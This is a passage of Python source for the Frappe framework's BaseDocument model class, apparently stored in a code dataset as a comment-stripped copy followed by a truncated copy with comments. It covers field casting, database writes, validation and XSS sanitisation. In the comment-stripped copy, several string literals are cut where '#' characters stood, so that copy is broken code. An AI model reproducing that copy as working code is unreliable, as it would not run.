\t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self): \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn out ",
                    "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and 